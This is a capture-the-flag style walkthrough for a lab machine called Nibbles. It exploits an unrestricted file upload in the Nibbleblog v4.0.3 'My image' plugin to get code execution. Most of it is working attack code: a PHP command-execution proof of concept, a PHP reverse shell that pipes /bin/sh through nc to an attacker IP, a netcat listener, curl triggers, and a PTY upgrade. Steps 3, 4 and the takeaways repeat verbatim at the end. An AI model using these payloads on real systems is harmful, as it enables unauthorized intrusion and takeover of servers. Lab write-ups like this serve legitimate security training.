# 14. Nibbles — Initial Foothold & Reverse Shell

## 1. Vulnerability Overview

* **Objective:** Leverage administrative dashboard access to achieve Remote Code Execution (RCE) and establish an interactive reverse shell.
* **Root Cause:** The **My image** plugin in **Nibbleblog v4.0.3** fails to validate file extensions or MIME content types on upload, allowing an authenticated attacker to upload an executable `.php` script instead of an image file.

---

## 2. Exploitation Steps

### Step 1: Verify Remote Code Execution (Proof of Concept)
Before deploying a full reverse shell, verify command execution with a minimal PHP payload:

1. Create a lightweight PoC script locally (`poc.php`):
   ```php
   <?php system('id'); ?>
   ```
2. Log in to the Nibbleblog admin panel and navigate to **`Plugins` $\rightarrow$ `My image` $\rightarrow$ `Configure`**, then upload the file.
   *(Note: Ignore the PHP image-resizing warnings displayed on the page after uploading—the file is still written to the web root.)*
3. Trigger the uploaded script via `curl`:
   ```bash
   curl http://<TARGET_IP>/nibbleblog/content/private/plugins/my_image/image.php
   ```
4. **Result:** The response returns `uid=1001(nibbler)`, confirming arbitrary command execution as the `nibbler` user.

### Step 2: Weaponize with a Reverse Shell Payload
1. Start a Netcat listener on the attack box (`tun0` interface):
   ```bash
   nc -lvnp 9443
   ```
2. Create a PHP reverse shell payload (`shell.php`):
   ```php
   <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_TUN0_IP> 9443 >/tmp/f"); ?>
   ```
3. Re-upload this payload through the **`My image`** plugin configuration page to overwrite `image.php`.

### Step 3: Trigger & Catch the Reverse Shell
1. Request the uploaded script via `curl` or a web browser:
   ```bash
   curl http://<TARGET_IP>/nibbleblog/content/private/plugins/my_image/image.php
   ```
2. **Result:** The Netcat listener catches the incoming reverse shell connection:
   ```text
   connect to [10.10.14.x] from (UNKNOWN) [<TARGET_IP>]
   $ id
   uid=1001(nibbler)
   ```

### Step 4: TTY Shell Upgrade & Post-Exploitation Enumeration
Initial reverse shells lack job control, tab-completion, and proper terminal handling:

1. Upgrade to an interactive PTY Bash shell using Python 3:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```
2. Inspect the user's home directory and verify local file access:
   ```bash
   cd /home/nibbler
   ls -la
   cat user.txt
   ```

---

## Key Takeaways for Future Assessments
1. **Audit CMS Upload Functionality First:** Whenever administrative access to a CMS is obtained, immediately inspect theme and plugin upload features for missing file-type validation.
2. **Validate RCE with a Minimal PoC:** Confirming execution with a simple command (`id` or `whoami`) before launching a full reverse shell saves troubleshooting time if firewall rules or payload syntax block outbound connections.
### Step 3: Trigger & Catch the Reverse Shell
1. Request the uploaded script via `curl` or a web browser:
   ```bash
   curl http://<TARGET_IP>/nibbleblog/content/private/plugins/my_image/image.php
   ```
2. **Result:** The Netcat listener catches the incoming reverse shell connection:
   ```text
   connect to [10.10.14.x] from (UNKNOWN) [<TARGET_IP>]
   $ id
   uid=1001(nibbler)
   ```

### Step 4: TTY Shell Upgrade & Post-Exploitation Enumeration
Initial reverse shells lack job control, tab-completion, and proper terminal handling:

1. Upgrade to an interactive PTY Bash shell using Python 3:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```
2. Inspect the user's home directory and verify local file access:
   ```bash
   cd /home/nibbler
   ls -la
   cat user.txt
   ```

---

## Key Takeaways for Future Assessments
1. **Audit CMS Upload Functionality First:** Whenever administrative access to a CMS is obtained, immediately inspect theme and plugin upload features for missing file-type validation.
2. **Validate RCE with a Minimal PoC:** Confirming execution with a simple command (`id` or `whoami`) before launching a full reverse shell saves troubleshooting time if firewall rules or payload syntax block outbound connections.
